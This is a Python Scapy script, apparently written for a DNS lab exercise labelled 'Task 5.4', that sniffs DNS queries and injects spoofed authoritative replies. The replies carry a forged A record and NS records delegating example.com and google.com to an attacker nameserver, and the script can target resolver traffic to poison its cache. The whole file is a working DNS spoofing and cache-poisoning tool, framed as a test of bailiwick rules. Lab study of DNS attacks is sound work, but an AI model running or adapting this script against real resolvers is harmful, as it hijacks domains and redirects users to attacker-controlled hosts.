#!/usr/bin/env python3
"""DNS Cross-Domain NS Spoofing for Task 5.4

This script tests DNS cache acceptance rules by injecting TWO NS records:
1. example.com -> ns.attacker32.com (in-bailiwick, should be accepted)
2. google.com -> ns.attacker32.com (out-of-bailiwick, should be rejected)

The goal is to demonstrate that DNS servers implement bailiwick rules that
prevent an authoritative response for one domain from delegating authority
for unrelated domains.

Usage:
  python3 dns_spoof_cross_domain.py --iface br-xxxx --domain example.com
"""

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send, conf
import argparse
import logging
import sys


def make_cross_domain_spoof_handler(target_domain: str, cross_domain: str, attacker_ns: str, attacker_ns_ip: str, spoof_ip: str, retries: int = 1):
    """
    Create a handler that injects TWO NS records in the Authority section:
    - One for the queried domain (target_domain) -> should be accepted (in-bailiwick)
    - One for an unrelated domain (cross_domain) -> should be rejected (out-of-bailiwick)
    """
    target_domain = target_domain.rstrip('.').lower()
    cross_domain = cross_domain.rstrip('.').lower()
    
    def _handler(pkt):
        try:
            if DNS not in pkt:
                return
            
            if not hasattr(pkt[DNS], 'qd') or pkt[DNS].qd is None:
                return
            
            qname = pkt[DNS].qd.qname.decode('utf-8').rstrip('.').lower()
            
            # Only match queries for the target domain (example.com)
            if target_domain not in qname:
                return
            
            logging.info('Matched DNS query for %s from %s', qname, pkt[IP].src)
            logging.info('Injecting NS records for BOTH %s and %s (cross-domain attack)', target_domain, cross_domain)
            
            # Build spoofed reply
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            
            # Answer section: A record for the queried name
            ans = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata=spoof_ip)
            
            # Authority section: TWO NS records
            # 1. In-bailiwick: example.com NS (should be accepted)
            ns_record_valid = DNSRR(rrname=target_domain, type='NS', ttl=259200, rdata=attacker_ns)
            
            # 2. Out-of-bailiwick: google.com NS (should be rejected by bailiwick rules)
            ns_record_cross = DNSRR(rrname=cross_domain, type='NS', ttl=259200, rdata=attacker_ns)
            
            # Additional section: Glue record for attacker NS
            ns_glue = DNSRR(rrname=attacker_ns, type='A', ttl=259200, rdata=attacker_ns_ip)
            
            # Build DNS response with 2 NS records in authority section
            dns = DNS(
                id=pkt[DNS].id,
                qd=pkt[DNS].qd,
                aa=1,  # Authoritative answer
                rd=0,  # Recursion not desired
                qr=1,  # Query response
                qdcount=1,
                ancount=1,  # 1 answer
                nscount=2,  # 2 authority records (in-bailiwick + cross-domain)
                arcount=1,  # 1 additional (glue)
                an=ans,
                ns=ns_record_valid/ns_record_cross,  # Stack both NS records
                ar=ns_glue
            )
            
            spoof = ip/udp/dns
            
            # Send multiple copies to win race
            for i in range(retries):
                send(spoof, verbose=False)
            
            logging.info('Sent %d spoofed replies with NS records for %s AND %s', retries, target_domain, cross_domain)
        
        except Exception:
            logging.exception('Error handling packet')
    
    return _handler


def parse_args():
    p = argparse.ArgumentParser(description='DNS Cross-Domain NS Spoofing for Task 5.4 (Bailiwick Testing)')
    p.add_argument('--iface', '-i', required=True, help='Interface to sniff on (e.g., br-xxxx)')
    p.add_argument('--domain', '-d', default='example.com', help='Target domain to query/attack (default: example.com)')
    p.add_argument('--cross-domain', default='google.com', help='Cross-domain to attempt hijacking (default: google.com)')
    p.add_argument('--attacker-ns', default='ns.attacker32.com', help='Attacker nameserver hostname (default: ns.attacker32.com)')
    p.add_argument('--attacker-ns-ip', default='10.9.0.153', help='Attacker nameserver IP (default: 10.9.0.153)')
    p.add_argument('--spoof-ip', '-s', default='10.0.2.5', help='IP to return in Answer section (default: 10.0.2.5)')
    p.add_argument('--retries', '-r', type=int, default=3, help='Number of spoofed replies per match (default: 3)')
    p.add_argument('--target-resolver', action='store_true', help='Target resolver->authoritative queries (recommended)')
    return p.parse_args()


def main():
    args = parse_args()
    
    logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
    
    logging.info('=== Task 5.4: Cross-Domain NS Spoofing (Bailiwick Testing) ===')
    logging.info('Using interface: %s', args.iface)
    logging.info('Target domain (queried): %s', args.domain)
    logging.info('Cross-domain (hijack attempt): %s', args.cross_domain)
    logging.info('Attacker NS: %s (%s)', args.attacker_ns, args.attacker_ns_ip)
    logging.info('Spoof IP: %s', args.spoof_ip)
    logging.info('Retries: %d', args.retries)
    
    # Set BPF filter
    if args.target_resolver:
        bpf_filter = 'udp and src host 10.9.0.53 and dst port 53'
        logging.info('Mode: Resolver->Authoritative (poisoning resolver cache)')
    else:
        bpf_filter = 'udp and dst port 53'
        logging.info('Mode: User->Resolver')
    
    logging.info('BPF filter: %s', bpf_filter)
    logging.info('')
    logging.info('Expected outcome:')
    logging.info('  - NS record for %s should be ACCEPTED (in-bailiwick)', args.domain)
    logging.info('  - NS record for %s should be REJECTED (out-of-bailiwick)', args.cross_domain)
    logging.info('')
    
    handler = make_cross_domain_spoof_handler(
        args.domain, 
        args.cross_domain, 
        args.attacker_ns, 
        args.attacker_ns_ip, 
        args.spoof_ip, 
        args.retries
    )
    
    logging.info('Starting packet sniffing...')
    
    try:
        sniff(iface=args.iface, filter=bpf_filter, prn=handler, store=0)
    except KeyboardInterrupt:
        logging.info('Interrupted by user, exiting')
        sys.exit(0)


if __name__ == '__main__':
    main()
